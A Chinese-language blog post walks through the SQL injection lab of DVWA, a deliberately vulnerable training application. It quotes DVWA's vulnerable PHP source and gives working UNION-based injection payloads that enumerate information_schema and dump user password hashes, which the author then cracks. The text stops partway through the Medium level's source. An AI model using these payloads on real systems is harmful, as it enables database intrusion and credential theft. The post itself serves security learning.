@@ -1,0 +1,309 @@
+<!doctype html><html lang=zh-cn dir=ltr><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="前言 SQL注入，比较熟悉的名字。看看 DVWA 里能怎么玩吧。 原理 拼字符串，和命令注入原理一样。 解题 收集信息 Low难度下SQL注入是一个简单的表单。 随"><title>DVWA上手记录-SQL注入</title>
+<link rel=canonical href=https://weakptr.site/p/get-start-dvwa-06/><link rel=stylesheet href=/scss/style.min.709d4f89582c5a09dc94158a722a16093cdffe24d9a8c77dd3f422c786203c41.css><script src=https://unpkg.com/dayjs@1.8.21/dayjs.min.js></script><script src=https://unpkg.com/dayjs@1.8.21/plugin/relativeTime.js></script><script src=https://unpkg.com/dayjs@1.8.21/locale/zh-cn.js></script><script>dayjs.locale("zh-cn"),dayjs.extend(dayjs_plugin_relativeTime)</script><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="https://hm.baidu.com/hm.js?dbb9df33a2de52aede8bccd84a7493ad",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script><meta property="og:title" content="DVWA上手记录-SQL注入"><meta property="og:description" content="前言 SQL注入，比较熟悉的名字。看看 DVWA 里能怎么玩吧。 原理 拼字符串，和命令注入原理一样。 解题 收集信息 Low难度下SQL注入是一个简单的表单。 随"><meta property="og:url" content="https://weakptr.site/p/get-start-dvwa-06/"><meta property="og:site_name" content="weakptr's 笔记"><meta property="og:type" content="article"><meta property="article:section" content="Post"><meta property="article:tag" content="security"><meta property="article:tag" content="dvwa"><meta property="article:tag" content="sqli"><meta property="article:published_time" content="2022-04-27T15:43:00+08:00"><meta property="article:modified_time" content="2022-04-27T15:43:00+08:00"><meta name=twitter:title content="DVWA上手记录-SQL注入"><meta name=twitter:description content="前言 SQL注入，比较熟悉的名字。看看 DVWA 里能怎么玩吧。 原理 拼字符串，和命令注入原理一样。 解题 收集信息 Low难度下SQL注入是一个简单的表单。 随"><link rel="shortcut icon" href=/favicon.ico></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.setItem(e,"light")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/avatar_hub37949326d1692892aa1e64434c0dda6_382115_300x0_resize_box_3.png width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍑</span></figure><div class=site-meta><h1 class=site-name><a href=/>weakptr's 笔记</a></h1><h2 class=site-description>弃船！</h2></div></header><ol class=social-menu><li><a href=https://github.com/nnnewb/ target=_blank title=GitHub><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg><span>首页</span></a></li><li><a href=/about><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg><span>关于我</span></a></li><li><a href=/archive><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg><span>归档</span></a></li><li><a href=/categories><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg><span>分类</span></a></li><li><a href=/tags><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-tag" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11 3l9 9a1.5 1.5.0 010 2l-6 6a1.5 1.5.0 01-2 0L3 11V7a4 4 0 014-4h4"/><circle cx="9" cy="9" r="2"/></svg><span>标签</span></a></li><li><a href=/link><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg><span>友链</span></a></li><li><a href=/search><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg><span>搜索</span></a></li><div class=menu-bottom-section></div></ol></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/security/>security</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/get-start-dvwa-06/>DVWA上手记录-SQL注入</a></h2></div><footer class=article-time><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg><time class=article-time--published datetime=2022-04-27T15:43:00+08:00>2022年 4月 27日</time></div><div><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg><time class=article-time--reading>阅读时长: 6 分钟</time></div></footer></div></header><section class=article-content><h2 id=前言>前言</h2><p>SQL注入，比较熟悉的名字。看看 DVWA 里能怎么玩吧。</p><h2 id=原理>原理</h2><p>拼字符串，和命令注入原理一样。</p><h2 id=解题>解题</h2><h3 id=收集信息>收集信息</h3><p>Low难度下SQL注入是一个简单的表单。</p><p><img src=/p/get-start-dvwa-06/image-20220427135511588.png width=554 height=260 srcset="/p/get-start-dvwa-06/image-20220427135511588_hub07b0edd99b217881ccdcccc18c385fd_19797_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427135511588_hub07b0edd99b217881ccdcccc18c385fd_19797_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427135511588 class=gallery-image data-flex-grow=213 data-flex-basis=511px></p><p>随便提交什么东西注意到地址栏变化。</p><p><img src=/p/get-start-dvwa-06/image-20220427135532773.png width=496 height=59 srcset="/p/get-start-dvwa-06/image-20220427135532773_hu6a0da43ddc23bfb6af10f644ca1b64bf_5365_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427135532773_hu6a0da43ddc23bfb6af10f644ca1b64bf_5365_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427135532773 class=gallery-image data-flex-grow=840 data-flex-basis=2017px></p><p>尝试提高难度继续观察。Medium难度下表单如下。</p><p><img src=/p/get-start-dvwa-06/image-20220427135617461.png width=371 height=178 srcset="/p/get-start-dvwa-06/image-20220427135617461_hu0a9dfdf5ac88fb9daf47e4f628f987f7_7860_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427135617461_hu0a9dfdf5ac88fb9daf47e4f628f987f7_7860_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427135617461 class=gallery-image data-flex-grow=208 data-flex-basis=500px></p><p>High难度表单如下。</p><p><img src=/p/get-start-dvwa-06/image-20220427135110188.png width=724 height=444 srcset="/p/get-start-dvwa-06/image-20220427135110188_hu0cff8eb887f9a62e6151f779494ecc79_46075_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427135110188_hu0cff8eb887f9a62e6151f779494ecc79_46075_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427135110188 class=gallery-image data-flex-grow=163 data-flex-basis=391px></p><p>任务是窃取用户1~5的密码。</p><h3 id=low-难度>Low 难度</h3><p>手工注入，先尝试用经典的<code>'</code>来检测。</p><p><img src=/p/get-start-dvwa-06/image-20220427135902575.png width=1074 height=96 srcset="/p/get-start-dvwa-06/image-20220427135902575_hud9bcdfead344ebea607c929391fabaf7_9497_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427135902575_hud9bcdfead344ebea607c929391fabaf7_9497_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427135902575 class=gallery-image data-flex-grow=1118 data-flex-basis=2685px></p><p>存在注入。比较菜，继续前先看看源码再决定用什么 payload。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// Get input
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$id</span> <span class=o>=</span> <span class=nv>$_REQUEST</span><span class=p>[</span> <span class=s1>&#39;id&#39;</span> <span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=nv>$_DVWA</span><span class=p>[</span><span class=s1>&#39;SQLI_DB&#39;</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nx>MYSQL</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1>// Check database
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT first_name, last_name FROM users WHERE user_id = &#39;</span><span class=si>$id</span><span class=s2>&#39;;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span>  <span class=nv>$query</span> <span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=p>((</span><span class=nx>is_object</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]))</span> <span class=o>?</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>:</span> <span class=p>((</span><span class=nv>$___mysqli_res</span> <span class=o>=</span> <span class=nx>mysqli_connect_error</span><span class=p>())</span> <span class=o>?</span> <span class=nv>$___mysqli_res</span> <span class=o>:</span> <span class=k>false</span><span class=p>))</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=c1>// Get results
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>while</span><span class=p>(</span> <span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=c1>// Get values
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$first</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;first_name&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>                <span class=nv>$last</span>  <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;last_name&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=c1>// Feedback for end user
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;ID: </span><span class=si>{</span><span class=nv>$id</span><span class=si>}</span><span class=s2>&lt;br /&gt;First name: </span><span class=si>{</span><span class=nv>$first</span><span class=si>}</span><span class=s2>&lt;br /&gt;Surname: </span><span class=si>{</span><span class=nv>$last</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=nx>mysqli_close</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nx>SQLITE</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1>// 略 ...
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> 
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>目标SQL是<code>SELECT first_name, last_name FROM users WHERE user_id = '$id'</code>。在不知道被注入的SQL长什么样的时候其实比较倾向于连接一个布尔表达式，这样就有一个比较稳定的1比特观察窗口，可以拿来判断是否存在用户或者逐位猜解用户名、密码、字段名什么的。</p><p>这里先尝试连接一个 <code>' or 1=1 -- </code>确定注入的格式（注意 <code>--</code>后面接一个空格），但暂时不会用这个方式注入。</p><p><img src=/p/get-start-dvwa-06/image-20220427141637645.png width=382 height=419 srcset="/p/get-start-dvwa-06/image-20220427141637645_hue2e4a6d077791d7aeae06767a61d87e9_11310_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427141637645_hue2e4a6d077791d7aeae06767a61d87e9_11310_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427141637645 class=gallery-image data-flex-grow=91 data-flex-basis=218px></p><p>先尝试下 <code>union</code> 联查一下表名,<code>' or 1=1 UNION SELECT table_schema, table_name FROM information_schema.tables;--</code>，得到这样的输出。</p><p><img src=/p/get-start-dvwa-06/image-20220427143108884.png width=678 height=627 srcset="/p/get-start-dvwa-06/image-20220427143108884_hue95434ff54181a3e552cad74dc79c640_24492_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427143108884_hue95434ff54181a3e552cad74dc79c640_24492_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427143108884 class=gallery-image data-flex-grow=108 data-flex-basis=259px></p><p>太长不全部截图了。接下来注意看一下可疑的表，直接 ctrl+f 在网页里搜 <code>user</code>，很快找到这里：</p><p><img src=/p/get-start-dvwa-06/image-20220427143202464.png width=625 height=71 srcset="/p/get-start-dvwa-06/image-20220427143202464_hu307659ad2afc97f1beb113925ecf5d18_1850_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427143202464_hu307659ad2afc97f1beb113925ecf5d18_1850_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427143202464 class=gallery-image data-flex-grow=880 data-flex-basis=2112px></p><p>接着找出 <code>users</code> 表的字段名，还是通过 <code>information_schema</code> ，新的 payload如下。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=s1>&#39; UNION SELECT c.COLUMN_NAME,c.COLUMN_TYPE  FROM information_schema.`COLUMNS` c WHERE c.TABLE_SCHEMA =&#39;</span><span class=n>dvwa</span><span class=s1>&#39; AND c.TABLE_NAME =&#39;</span><span class=n>users</span><span class=s1>&#39;; -- 
+</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/get-start-dvwa-06/image-20220427143506909.png width=646 height=519 srcset="/p/get-start-dvwa-06/image-20220427143506909_hue89a969cdf307e28a18e20ab7378474c_16373_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427143506909_hue89a969cdf307e28a18e20ab7378474c_16373_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427143506909 class=gallery-image data-flex-grow=124 data-flex-basis=298px></p><p>注意到字段名 <code>password</code>，接下来再 <code>union</code> 查询一下 <code>user_id</code> 和 <code>password</code> 。</p><p><code>union</code> 注入的时候有几个我觉得可能要注意的问题：</p><ol><li>被注入的 SQL 查询了几个列（<code>union</code>的查询必须有相同数量的列），或者说有几个列的可以被观测到（查出来而且前端有变化）？这里我盲猜是两个或者三个列，所以 payload 里只写了两个列。</li><li>查询出来之后有没有别的处理？如果还有别的判断，比如是静态类型的语言，<code>union</code>查询的列类型不匹配；或者有别的业务逻辑没通过，都可能失败。</li></ol><p>注入payload：<code>' UNION SELECT user_id,password FROM users; --</code></p><p><img src=/p/get-start-dvwa-06/image-20220427143644718.png width=395 height=332 srcset="/p/get-start-dvwa-06/image-20220427143644718_hua49cdb081ad8f1de4e88b5ebeefa5809_9308_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427143644718_hua49cdb081ad8f1de4e88b5ebeefa5809_9308_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427143644718 class=gallery-image data-flex-grow=118 data-flex-basis=285px></p><p>成功取得密码，但密码被哈希了，盲猜 md5，直接上 cmd5 解密。</p><p><img src=/p/get-start-dvwa-06/image-20220427143819668.png width=721 height=244 srcset="/p/get-start-dvwa-06/image-20220427143819668_huda5786e8946bed5b5883742c81b2163b_8988_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427143819668_huda5786e8946bed5b5883742c81b2163b_8988_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427143819668 class=gallery-image data-flex-grow=295 data-flex-basis=709px></p><p><img src=/p/get-start-dvwa-06/image-20220427143838942.png width=707 height=259 srcset="/p/get-start-dvwa-06/image-20220427143838942_huf0baa613eae9510762ca67d57c112505_8804_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427143838942_huf0baa613eae9510762ca67d57c112505_8804_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427143838942 class=gallery-image data-flex-grow=272 data-flex-basis=655px></p><p><img src=/p/get-start-dvwa-06/image-20220427143852594.png width=680 height=238 srcset="/p/get-start-dvwa-06/image-20220427143852594_huf849a7d99be69135895294c4d6e3d294_8498_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427143852594_huf849a7d99be69135895294c4d6e3d294_8498_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427143852594 class=gallery-image data-flex-grow=285 data-flex-basis=685px></p><p><img src=/p/get-start-dvwa-06/image-20220427143905939.png width=696 height=246 srcset="/p/get-start-dvwa-06/image-20220427143905939_hu046a75d3e4e0e43329a69d0d4df0e4e3_8408_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427143905939_hu046a75d3e4e0e43329a69d0d4df0e4e3_8408_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427143905939 class=gallery-image data-flex-grow=282 data-flex-basis=679px></p><p>5和1的哈希是一样的。到这里解密就全部完成了。</p><h3 id=medium-难度>Medium 难度</h3><p><img src=/p/get-start-dvwa-06/image-20220427144716349.png width=392 height=175 srcset="/p/get-start-dvwa-06/image-20220427144716349_hub0f8913afa5cca6b3e2fc8a6de0cc0fa_7931_480x0_resize_box_3.png 480w, /p/get-start-dvwa-06/image-20220427144716349_hub0f8913afa5cca6b3e2fc8a6de0cc0fa_7931_1024x0_resize_box_3.png 1024w" loading=lazy alt=image-20220427144716349 class=gallery-image data-flex-grow=224 data-flex-basis=537px></p><p>注意到几点：</p><ol><li>前端输入变成了下拉选择。</li><li>变成了 post 方式请求。</li></ol><p>接着看下代码。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span><span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;Submit&#39;</span> <span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=c1>// Get input
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$id</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span> <span class=s1>&#39;id&#39;</span> <span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$id</span> <span class=o>=</span> <span class=nx>mysqli_real_escape_string</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span> <span class=nv>$id</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>switch</span> <span class=p>(</span><span class=nv>$_DVWA</span><span class=p>[</span><span class=s1>&#39;SQLI_DB&#39;</span><span class=p>])</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nx>MYSQL</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT first_name, last_name FROM users WHERE user_id = </span><span class=si>$id</span><span class=s2>;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$result</span> <span class=o>=</span> <span class=nx>mysqli_query</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>],</span> <span class=nv>$query</span><span class=p>)</span> <span class=k>or</span> <span class=k>die</span><span class=p>(</span> <span class=s1>&#39;&lt;pre&gt;&#39;</span> <span class=o>.</span> <span class=nx>mysqli_error</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s2>&#34;___mysqli_ston&#34;</span><span class=p>])</span> <span class=o>.</span> <span class=s1>&#39;&lt;/pre&gt;&#39;</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>            <span class=c1>// Get results
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>while</span><span class=p>(</span> <span class=nv>$row</span> <span class=o>=</span> <span class=nx>mysqli_fetch_assoc</span><span class=p>(</span> <span class=nv>$result</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=c1>// Display values
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=nv>$first</span> <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;first_name&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>                <span class=nv>$last</span>  <span class=o>=</span> <span class=nv>$row</span><span class=p>[</span><span class=s2>&#34;last_name&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                <span class=c1>// Feedback for end user
+</span></span></span><span class=line><span class=cl><span class=c1></span>                <span class=k>echo</span> <span class=s2>&#34;&lt;pre&gt;ID: </span><span class=si>{</span><span class=nv>$id</span><span class=si>}</span><span class=s2>&lt;br /&gt;First name: </span><span class=si>{</span><span class=nv>$first</span><span class=si>}</span><span class=s2>&lt;br /&gt;Surname: </span><span class=si>{</span><span class=nv>$last</span><span class=si>}</span><span class=s2>&lt;/pre&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=p>}</span>
+</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=k>case</span> <span class=nx>SQLITE</span><span class=o>:</span>
+</span></span><span class=line><span class=cl>            <span class=c1>// 略 ...
+</span></span></span><span class=line><span class=cl><span class=c1></span>            <span class=k>break</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1>// This is used later on in the index.php page
+</span></span></span><span class=line><span class=cl><span class=c1>// Setting it here so we can close the database connection in here like in the rest of the source scripts
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$query</span>  <span class=o>=</span> <span class=s2>&#34;SELECT COUNT(*) FROM users;&#34;</span><span class=p>;</span>
